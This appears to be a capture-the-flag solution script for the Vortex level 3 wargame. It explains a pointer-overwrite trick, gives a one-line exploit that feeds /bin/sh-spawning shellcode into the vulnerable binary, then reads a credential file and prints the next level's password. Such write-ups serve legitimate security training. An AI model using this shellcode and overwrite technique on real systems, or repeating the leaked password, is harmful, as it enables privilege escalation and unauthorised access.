# From code vortex3.c there r 2 lines of code 
# if (((unsigned long)lpp & 0xffff0000) != 0x08040000) exit(2);
# **lpp = (unsigned long)&buf;
# So we have to overwrite address of lpp with address starting with 0x0804

# Use thie command to see which section is writable
# And find the address of useful function starting with 0x0804
readelf -S /vortex/vortex3

# We can get [.plt ... 08049020 ... AX ...]
# Which is writable
# And also a useful function at 0x08049050 which is jump to exit function at 0x0804b1e0

# Because we can only overwrite dereference of dereference of lpp
# So we let lpp point to 0x08049052 which is the address of exit function
# And exit function will be called to buf's address which is shellcode

/vortex/vortex3 $(python3 -c 'import sys; import struct; sys.stdout.buffer.write(b"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + b"A" * 98 + struct.pack("<I", 0x08049052))')

cat /etc/vortex_pass/vortex4
# password: v9kEqvkkq